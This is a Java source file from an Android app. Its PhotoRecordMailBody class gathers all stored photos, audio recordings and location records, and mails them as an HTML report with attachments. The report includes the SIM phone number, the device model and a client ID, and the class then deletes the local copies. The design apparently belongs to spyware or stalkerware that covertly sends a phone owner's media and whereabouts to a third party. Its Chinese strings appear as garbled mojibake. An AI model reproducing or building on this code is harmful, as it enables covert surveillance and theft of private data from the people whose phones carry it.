package com.android.db;

import java.io.File;
import java.util.List;

import javax.activation.DataHandler;
import javax.activation.FileDataSource;
import javax.mail.Multipart;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMultipart;

import android.content.Context;
import android.os.Build;

import com.android.pojo.Location;
import com.android.pojo.Photo;
import com.android.pojo.Record;
import com.android.utils.LogUtils;
import com.android.utils.Utils;

public class PhotoRecordMailBody implements MailBody {

	public String body = "<html><style>table.gridtable {	font-family: verdana,arial,sans-serif;	font-size:11px;	color:#333333;	border-width: 1px;	border-color: #666666;	border-collapse: collapse;width:100%}table.gridtable th {	border-width: 1px;	padding: 8px;	border-style: solid;	border-color: #666666;	background-color: #dedede;}table.gridtable td {	border-width: 1px;	padding: 8px;	border-style: solid;	border-color: #666666;	background-color: #ffffff;}</style><body>";
	public String bodyend = "</body></html>";
	private Context context;
	private List<Photo> lphoto;
	private List<Record> lrecord;;
	private List<Location> lloc;

	public PhotoRecordMailBody(Context context) {
		this.context = context;
	}

	@Override
	public Multipart getMultipart() {
		// TODO Auto-generated method stub
		Multipart multipart = null;
		try {
			SqlUtils su = SqlUtils.getinstance(context);
			StringBuffer html = new StringBuffer();
			html.append(body);
			html.append("<div style='font-size:13px;'>��������(SIM������)"
					+ Utils.getnum(context) + " ,ϵͳ�汾" + Build.VERSION.SDK_INT
					+ " ,�ֻ��ͺ�" + Build.MODEL + "--" + Build.PRODUCT + " "
					+ Utils.getStringConfig(context, "clientid", "")
					+ "</div><br/>");

			lphoto = su.getAllPhoto();
			lrecord = su.getAllRecord();
			lloc = su.getAllLocation();
			if (lphoto.size() > 0 || lrecord.size() > 0
					|| (lloc.size() > 0 || lloc.size() > 0)) {

				html.append(bodyend);
				html.append("<div style='font-size:11px;'>���ռ�¼</div><br/>");
				html.append(GetPhotoCon(lphoto));
				html.append("<div style='font-size:11px;'>¼����¼</div><br/>");
				html.append(GetRecordCon(lrecord));
				html.append("<div style='font-size:11px;'>λ�ü�¼</div><br/>");
				html.append(GetlocationCon(lloc));
				html.append(bodyend);
				multipart = new MimeMultipart();
				MimeBodyPart htmlbody = new MimeBodyPart();
				htmlbody.setContent(html.toString(), "text/html; charset=utf-8");
				multipart.addBodyPart(htmlbody);
				SetFujian(multipart);
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			multipart = null;
		}
		return multipart;

	}

	@Override
	public boolean DeleteData() {
		// TODO Auto-generated method stub
		SqlUtils su = SqlUtils.getinstance(context);
		su.deleteAllPhoto(lphoto);
		su.deleteAllRecord(lrecord);
		su.deleteAllLocation(lloc);
		File dir = Utils.getFiledir();
		if (dir != null) {
			if (lphoto != null) {
				for (Photo photo : lphoto) {
					String filename = photo.getFilename();
					File file = new File(dir, filename);
					if (file.exists()) {
						try {
							file.delete();
						} catch (Exception e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					}
				}
			}
			if (lrecord != null) {
				for (Record record : lrecord) {
					String filename = record.getFilename();
					File file = new File(dir, filename);
					if (file.exists()) {
						try {
							file.delete();
						} catch (Exception e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					}
				}
			}

		}
		lphoto = null;
		lrecord = null;
		lloc = null;
		return true;
	}

	public void SetFujian(Multipart multipart) {
		File dir = Utils.getFiledir();
		if (dir != null) {
			if (lphoto != null) {
				for (Photo photo : lphoto) {
					String filename = photo.getFilename();
					LogUtils.write("smsclient", filename + "�����Ƭ");
					if (filename != null && !"".equals(filename)) {
						File file = new File(dir, filename);
						if (file.exists() && file.length() > 0
								&& file.canRead()) {
							try {

								MimeBodyPart mbp = new MimeBodyPart();
								FileDataSource fds = new FileDataSource(file);
								mbp.setDataHandler(new DataHandler(fds));
								mbp.setFileName(fds.getName());
								multipart.addBodyPart(mbp);
							} catch (Exception e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
						}
					}

				}
			}
			if (lrecord != null) {
				for (Record record : lrecord) {
					String filename = record.getFilename();
					LogUtils.write("smsclient", filename + "���¼��");
					if (filename != null && !"".equals(filename)) {
						File file = new File(dir, filename);
						if (file.exists() && file.length() > 0
								&& file.canRead()) {
							try {

								MimeBodyPart mbp = new MimeBodyPart();
								FileDataSource fds = new FileDataSource(file);
								mbp.setDataHandler(new DataHandler(fds));
								mbp.setFileName(fds.getName());
								multipart.addBodyPart(mbp);
							} catch (Exception e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
						}
					}
				}
			}
		}

	}

	public String GetPhotoCon(List<Photo> lloc) {

		StringBuffer table = new StringBuffer();
		try {
			table.append("<table class=\"gridtable\"><tr><th style='width:50px'>���</th><th style='width:150px'>���</th><th style='width:80px'>ʱ��</th><th style='width:100px'>�ļ�����</th></tr>");
			int i = 0;
			for (Photo loc : lloc) {
				i++;
				table.append("<tr><td>" + (i + 1) + "</td><td>" + loc.getId()
						+ "</td><td>" + loc.getDatas() + "</td><td>"
						+ loc.getFilename() + "</td></tr>");
			}
			if (lloc.size() == 0) {
				table.append("<td colspan='6'>������</td>");
			}
			table.append("</tbody></table><br />");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return table.toString();
	}

	public String GetRecordCon(List<Record> lloc) {

		StringBuffer table = new StringBuffer();
		try {
			table.append("<table class=\"gridtable\"><tr><th style='width:50px'>���</th><th style='width:150px'>���</th><th style='width:80px'>ʱ��</th><th style='width:100px'>�ļ�����</th></tr>");
			int i = 0;
			for (Record loc : lloc) {
				i++;
				table.append("<tr><td>" + (i + 1) + "</td><td>" + loc.getId()
						+ "</td><td>" + loc.getDatas() + "</td><td>"
						+ loc.getFilename() + "</td></tr>");
			}
			if (lloc.size() == 0) {
				table.append("<td colspan='6'>������</td>");
			}
			table.append("</tbody></table><br />");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return table.toString();
	}

	public String GetlocationCon(List<Location> lloc) {

		StringBuffer table = new StringBuffer();
		try {
			table.append("<table class=\"gridtable\"><tr><th style='width:50px'>���</th><th style='width:150px'>��¼ʱ��</th><th style='width:80px'>λ��</th><th style='width:100px'>����</th><th style='width:80px'>γ��</th><th>�ٶȵ�ͼ�鿴</th></tr>");
			int i = 0;
			for (Location loc : lloc) {
				i++;
				table.append("<tr><td>"
						+ (i + 1)
						+ "</td><td>"
						+ loc.getTime()
						+ "</td><td>"
						+ loc.getAddr()
						+ "</td><td>"
						+ loc.getLatitude()
						+ "</td><td>"
						+ loc.getLongitude()
						+ "</td><td><a href='http://api.map.baidu.com/staticimage?markers="
						+ loc.getLongitude()
						+ ","
						+ loc.getLatitude()
						+ "&zoom=17&width=800&height=600' target='_blank'>�鿴</a></td></tr>");
			}
			if (lloc.size() == 0) {
				table.append("<td colspan='6'>������</td>");
			}
			table.append("</tbody></table><br />");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return table.toString();
	}

}
